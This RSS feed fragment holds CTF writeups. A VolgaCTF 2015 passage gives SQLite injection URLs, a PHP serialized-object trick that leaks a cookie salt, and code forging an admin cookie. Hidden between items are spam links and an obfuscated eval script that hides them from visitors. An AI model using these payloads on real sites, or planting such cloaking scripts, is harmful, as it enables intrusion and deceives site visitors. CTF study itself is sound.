&quot;SecretAdminPanel&quot;.&lt;br&gt;I then visited the &quot;logs&quot; folder, and I found that my IP got logged with the parameters I submitted to the page (so far no params).&amp;nbsp;&lt;br&gt;I visited the SecretAdminPanel again and submitted some data through the GET request&amp;nbsp;&lt;/p&gt;&lt;p&gt;web2.2015.volgactf.ru/SecretAdminPanel?test=test&lt;/p&gt;&lt;p&gt;I saw this message: &quot;Don&#039;t attempt to hack, all requests will be logged.&quot;&amp;nbsp;&lt;br&gt;Well this, in CTFs, This message simply means: HACK from here.&lt;/p&gt;&lt;p&gt;At the beginning I though that we will have SQLi in the INSERT statement in our request. I thought it will SQLi in the IP by injecting in the X-Forwarded-For or Client-IP request Headrs.&lt;br&gt;I tried SQLi there but didn&#039;t get any result.&amp;nbsp;&lt;br&gt;&lt;br&gt;Then probably in the params.&amp;nbsp;&lt;br&gt;I tried the following request:&amp;nbsp;http://web2.2015.volgactf.ru/SecretAdminPanel?test=test%27&lt;br&gt;and I got&amp;nbsp;&lt;strong&gt;Error:&lt;/strong&gt;&amp;nbsp;unrecognized token: &quot;&quot;;}&#039;)&quot;&lt;br&gt;Interesting we have some errors available. looks like SQLi and my request was NOT logged. This means we probably had SQLi error and the request didn&#039;t finish processing due to the error.&lt;br&gt;I tried this one to double-check&lt;br&gt;http://web2.2015.volgactf.ru/SecretAdminPanel?test=test%27%27&lt;br&gt;and I got no errors and the request got logged perfectly.&amp;nbsp;&lt;br&gt;&lt;br&gt;&lt;strong&gt;Exploitation:&amp;nbsp;&lt;/strong&gt;&lt;br&gt;Now it is the time to exploit. I managed to know that th DBMS was sqlite. So this what I want to exploit: a SQLite database.&amp;nbsp;&lt;br&gt;I am injecting in an insert statement and I am injecting in the last column.&amp;nbsp;&lt;br&gt;I believe that the query in the backend was something like&lt;br&gt;&lt;br&gt;query = INSERT INTO logs (IP, PARAMS) VALUES ($ip, $params);&lt;/p&gt;&lt;p&gt;I usually when I have a SQLi bug and errors are enabled. I try to inject in different places in the query to see the errors of the database. As a result of seeing the errors I can see part of the query in the backend.&lt;br&gt;So I injected in this part of the query string&amp;nbsp;&lt;br&gt;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27=test&lt;br&gt;and that was the result&amp;nbsp;&lt;br&gt;&lt;strong&gt;Error:&lt;/strong&gt;&amp;nbsp;near &quot;&quot;;s:4:&quot;&quot;: syntax error&lt;br&gt;what we see here part of the INSERT query but we can see s:4: and this is part of a serialized string in PHP.&lt;br&gt;So probably the code in the backend something like this&amp;nbsp;&lt;br&gt;&lt;br&gt;$params = serialize($_GET)&lt;br&gt;query = &quot;INSERT INTO logs (IP, PARAMS) VALUES ($&#039;ip&#039;, &#039;$params&#039;);&quot;&lt;/p&gt;&lt;p&gt;now we want to have our injection with the serialization. I frist looked for the string concatenation operator in the SQLite to concatenate the result I want to see with the params. The string concatenation operator was &quot;||&quot;/&lt;br&gt;I tried this request first&amp;nbsp;&lt;br&gt;http://web2.2015.volgactf.ru/SecretAdminPanel?test=test&#039;||(Select &quot;a&quot;)||&#039;&lt;/p&gt;&lt;p&gt;The request worked successfully no SQL errors, this means our injection was correct.&amp;nbsp;&lt;br&gt;However I checked the logs page and that was the result&amp;nbsp;&lt;/p&gt;&lt;p&gt;array(2) {&lt;/p&gt;&lt;p&gt;&amp;nbsp; [&quot;ip&quot;]=&amp;gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp; string(12) &quot;MY_IP&quot;&lt;/p&gt;&lt;p&gt;&amp;nbsp; [&quot;params&quot;]=&amp;gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp; bool(false)&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;}&lt;/p&gt;&lt;p&gt;Why is this ?? It looks like that PHP couldn&#039;t deserialize the column correctly.&amp;nbsp;&lt;br&gt;What they do in the backend something similar to this&amp;nbsp;&lt;br&gt;&lt;br&gt;SELECT IP, params from logs where IP = MyIP;&lt;br&gt;$params = unserialize(params)&lt;br&gt;var_dump($params)&lt;/p&gt;&lt;p&gt;so we have a problem in deserializing our data.&amp;nbsp;&lt;br&gt;This is true because our injection was something like&lt;br&gt;?test=test&#039;||(Select &quot;a&quot;)||&#039;&lt;/p&gt;&lt;p&gt;So the serialized string:&amp;nbsp;&#039;a:1:{s:4:&quot;test&quot;;s:22:&quot;test&#039;||(Select &quot;a&quot;)||&#039;&quot;;}&#039;&lt;br&gt;and the string stored in the database: &#039;a:1:{s:4:&quot;test&quot;;s:22:&quot;testa&quot;;}&#039;&lt;br&gt;This&amp;nbsp;discrepancy between the INSERT statement and what stores in the database cause this error.&lt;/p&gt;&lt;p&gt;To solve this, I used something like repeat and substring functions in sqlite to have valid serialized string and stored correctly in the database.&amp;nbsp;&lt;br&gt;&lt;br&gt;That was my final query&amp;nbsp;&lt;br&gt;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28SELECT%28substr%28group_concat%28name%29,0,5%29%29FROM%28sqlite_master%29%29||%28select%28replace%28substr%28quote%28zeroblob%28%28130%2b1%29/2%29%29,3,130%29,%220%22,%22a%22%29%29%29||%27&lt;/p&gt;&lt;p&gt;&lt;br&gt;Executing this query will return us the names of tables in the database.&lt;br&gt;This query to extract the content of the params column in the database&lt;br&gt;&lt;br&gt;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28SELECT%28hex%28substr%28group_concat%28params%29,100,61%29%29%29FROM%28logs%29%29||%28select%28replace%28substr%28quote%28zeroblob%28%289%2b1%29/2%29%29,3,9%29,%220%22,%22a%22%29%29%29||%27&lt;/p&gt;&lt;p&gt;I assumed we might get the params that the admin used to login into this page and then we will get the flag. However, it was not that easily.&amp;nbsp;&lt;br&gt;Unfortunately the data inside the database was only mine, which means that each use has its own copy of the database.&lt;br&gt;The flag wont be in the database so we need to think of something else.&amp;nbsp;&lt;br&gt;&lt;br&gt;In the cookies we have this interesting cookie.&amp;nbsp;PHPSESS=%7B%22isAdmin%22%3Afalse%7D0afb5cf5c7d66587da7c811767250458; expires=Fri, 08 May 2015 18:08:16 GMT; path=/; domain=.web2.2015.volgactf.ru; HttpOnly&lt;/p&gt;&lt;p&gt;Maybe to get the flag, we need to get the cookie salt used to form this cookie and form the valid cookie where isAdmin:true&lt;br&gt;another member in the team suggested to have the serialized Exception object, and when this object gets deseialized we will see our stacktrace and we might get something useful.&amp;nbsp;&lt;br&gt;&lt;br&gt;I used this query to add the exception object into the database.&amp;nbsp;&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;span data-rz-clipboard=&quot;true&quot;&gt;&lt;a class=&quot;vt-p&quot; style=&quot;text-decoration: underline;&quot; href=&quot;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0&quot; data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;TEXT&amp;quot;,&amp;quot;T_URL&amp;quot;:&amp;quot;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0&amp;quot;}&quot;&gt;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0&lt;/a&gt;&lt;span data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;TEXT&amp;quot;}&quot;&gt;:{}}&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span data-rz-clipboard=&quot;true&quot;&gt;and when we viewed the logs page we indeed saw the stacktrace and part of the output contains this&lt;br&gt;&lt;span data-rz-clipboard=&quot;true&quot;&gt;&lt;span data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;TEXT&amp;quot;}&quot;&gt;&lt;br&gt;object(Session)#3 (2) {&lt;br&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;[&quot;cookieSalt&quot;:&quot;Session&quot;:private]=&amp;gt;&lt;br&gt;string(20) &quot;nO97M0Za6cu9wDC72VVv&quot;&lt;br&gt;[&quot;params&quot;:&quot;Session&quot;:private]=&amp;gt;&lt;br&gt;array(1) {&lt;br&gt;[&quot;isAdmin&quot;]=&amp;gt;&lt;br&gt;bool(false)&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;div data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;LINE&amp;quot;,&amp;quot;RANDOM&amp;quot;:0.5038021015934646}&quot;&gt;No we have the salt. To construct the valid cookie we simply need to do the following:&lt;br&gt;&lt;br&gt;&lt;/div&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&amp;lt;?php&lt;br&gt;$str=&#039;{&quot;isAdmin&quot;:true}&#039;;&lt;br&gt;$salt=&#039;nO97M0Za6cu9wDC72VVv&#039;;&lt;br&gt;echo urlencode($str).md5($str.$salt);&lt;br&gt;?&amp;gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;and the flag was&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;span data-rz-clipboard=&quot;true&quot;&gt;&lt;span style=&quot;font-weight: bold; background-color: #b5eb5e;&quot; data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;TEXT&amp;quot;,&amp;quot;T_BOLD&amp;quot;:true,&amp;quot;T_BG_COLOR&amp;quot;:&amp;quot;#B5EB5E&amp;quot;}&quot;&gt;{417a4c17bd3132bba864dac9edf4ae7a}&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;Notes:&lt;br&gt;1- I think it worth more than 200 pts comparing to the challenge remote web or even the joy and relax challenges.&lt;br&gt;2- There was a much easier way to exploit the SQLi. Simply we could have used stacked quiries ^^. It is sqlite so I could have simply added the serialized Exception object into the DB using something similar to this query. you just need to know how to use the query without spaces because it was replaced with underscores &#039;_&#039; &amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;a class=&quot;vt-p&quot; style=&quot;text-decoration: underline;&quot; href=&quot;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0&quot; data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;TEXT&amp;quot;,&amp;quot;T_URL&amp;quot;:&amp;quot;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0&amp;quot;}&quot;&gt;http://web2.2015.volgactf.ru/SecretAdminPanel?test&lt;/a&gt;&#039;);INSERT INTO logs(IP, PARAMS) VALUES (&#039;127.0.0.1&#039;, &#039;O:9:&quot;Exception&quot;:0:{}&#039;)--&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;Sportswear Design&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.fitforhealth.eu/cdakshop/category/nike/&quot;&gt;Nike News&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Fri, 08 May 2015 17:41:19 +0000</pubDate>
+ <dc:creator>the_storm</dc:creator>
+ <guid isPermaLink="false">101 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/101#comments</comments>
+</item>
+<item>
+ <title>Infosec mini ctf writeup </title>
+ <link>https://ctfcrew.org/writeup/99</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;a href=&quot;/categories/stego&quot;&gt;stego&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/forensics&quot;&gt;forensics&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/33&quot;&gt;Infosec Institute CTF&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;div class=&quot;page&quot; title=&quot;Page 3&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;span style=&quot;color: #333333; font-size: 16px; font-weight: normal;&quot;&gt;This is the InfoSec CTF writeup.&lt;br&gt;The ctf was very great. However, I felt it a bit simpler I think that was intended as a basic starting level. Some of the challneges were very interesting others were very straight forward. One thing that make me suffer a bit is the images in the challneges. I always had the feeling that they always contained something (steganography). I also was suffering with some guessing challenges like levle number 9. Yet, the good thing about the challneges is that each one will teach you something. The purpose of the CTF was to share knowledge. Below, you can find my write-up so please read, enjoy and take the best of it.&amp;nbsp;&lt;br&gt;If you have any questions/comments, do NOT hesitate to contact me.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;span style=&quot;color: #333333; font-size: 16px; font-weight: normal;&quot;&gt;Thank you &lt;a class=&quot;vt-p&quot; href=&quot;http://www.infosecinstitute.com/&quot;&gt;InfoSec Institute&lt;/a&gt; for the CTF&lt;br&gt;&lt;br&gt;A pdf version of the solution can be found here.&lt;br&gt;&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;a class=&quot;vt-p&quot; style=&quot;font-family: Helvetica; font-size: 16px;&quot; href=&quot;https://www.dropbox.com/s/uuixb7zqcbyiq5x/solutions.zip?dl=0&quot;&gt;https://www.dropbox.com/s/uuixb7zqcbyiq5x/solutions.zip?dl=0&lt;/a&gt;&lt;span style=&quot;font-family: Helvetica;&quot;&gt;&lt;span style=&quot;font-size: 16px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span style=&quot;font-family: Helvetica;&quot;&gt;&lt;span style=&quot;font-size: 16px;&quot;&gt;If you would like to try the challenges before seeing the write-ups please check them on&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;a class=&quot;vt-p&quot; href=&quot;http://ctf.infosecinstitute.com/&quot;&gt;&lt;span style=&quot;font-family: Helvetica;&quot;&gt;&lt;span style=&quot;font-size: 16px;&quot;&gt;http://ctf.infosecinstitute.com/&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;br&gt;&lt;span style=&quot;font-family: Helvetica;&quot;&gt;&lt;span style=&quot;font-size: 16px;&quot;&gt;let&#039;s start :)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;Level One &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;“May the source be with you! “ &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Once I saw the word “source” then I expected that the flag will be in the HTML source code. I viewed the source code in my browser, and I managed to see the flag in the first line of the HTML code as illustrated below in the screenshot&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/1_1.png&quot; alt=&quot;&quot; width=&quot;724&quot; height=&quot;708&quot;&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;flag: infosec_flagis_welcome&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 4&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;Level Two &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;“It seems like the image is broken..Can you check the file?“ &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;I checked the HTML source code and I got the image link which was “img/leveltwo.jpeg” Downloaded the image file and now it is time to analyse the file. The first step I wanted to to check the file type to see if it is actually an image. Executing the “file” command on linux that was the result.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/2_1.png&quot; alt=&quot;&quot; width=&quot;1004&quot; height=&quot;78&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;looks like some ascii data inside not an image. Viewing the file content using the “cat” command that was the output “aW5mb3NlY19mbGFnaXNfd2VhcmVqdXN0c3RhcnRpbmc=“. The data is encoded in base64. I managed to know that because of the “=“ that was padded in the end of the text. using the base64 tool to decode that data that was the output &lt;/span&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;“infosec_flagis_wearejuststarting”&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;&lt;img src=&quot;/sites/default/files/writeups/images/2_2.png&quot; alt=&quot;&quot; width=&quot;1004&quot; height=&quot;108&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 5&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;Level Three &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Nothing was stated regarding explicitly for the challenge. However there was that image that contains a QR code. &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;sent the QR code to the following website &lt;a class=&quot;vt-p&quot; href=&quot;http://zxing.org/w/decode?u=http%3A%2F%2Fctf.infosecinstitute.com%2Fimg%2Fqrcode.%20png&quot;&gt;http://zxing.org/w/decode?u=http%3A%2F%2Fctf.infosecinstitute.com%2Fimg%2Fqrcode. png&lt;/a&gt;&lt;br&gt; That was the result&lt;br&gt; .. -. ..-. --- ... . -.-. ..-. .-.. .- --. .. ... -- --- .-. ... .. -. —.&lt;br&gt; looks like some morse code. We need to find something to decode it. Using the following the website http://morsecode.scphillips.com/translator.html I managed to translate the morse code and that was the result.&lt;br&gt; &lt;/span&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;“INFOSEC_FLAGIS_MORSING”&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 6&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;Level Four &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;“HTTP means Hypertext Transfer Protocol” &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;HTTP is a Hyptertext Transfer Protocol. I thought that I might find the flag in any of the headers received from the server. I fired up my burp suite proxy to see what I will get in the HTTP response. These were the headers received from the server.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;&lt;img src=&quot;/sites/default/files/writeups/images/4_1.png&quot; alt=&quot;&quot; width=&quot;741&quot; height=&quot;279&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;We can see that the server is setting a cookie in our browser. looks like it is encoding in some way however it has the same pattern as “infosec_flagis_xxxxxxx”&lt;br&gt; I didn’t know what was the encoding but it looks like some stream cipher. I expected it will be a caesar cipher. I coded this quick script to try all caesar with different steps. The script should stops once it finds the word “infosec”&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot; title=&quot;Caesar&quot;&gt;def decode_ceaser(input_str, n):&lt;br&gt;    output = []
+    for c in input_str:
+        temp = 97+((ord(c)-97+n)%26)
+        temp = chr(temp)
+        output.append(temp)
+    return output&lt;br&gt;for i in xrange(25):
+        res = decode_ceaser(encoded_str, i)
+        res = &#039;&#039;.join(res)
+        if &#039;infosec&#039; in res:
+            print res
+            break&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;and that was the result of running the script &lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;AndaleMono&#039;; color: rgb(100.000000%, 100.000000%, 100.000000%); background-color: rgb(0.000000%, 0.000000%, 0.000000%);&quot;&gt;infosec_flagis_welovecookies&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 7&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;Level Five: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;No text was written only an image. &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;I think this is steganography problem. It did take a lot of time for me to solve it since I am not that good with steganography. I checked the image with Stegsolve didn’t find anything. I checked it also with steghide but nothing. I checked some online websites and it was this website http://www.futureboy.us/stegano/decinput.html. I uploaded the image to the website and It resulted in some binary array as illustrated below&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/5_0.png&quot; 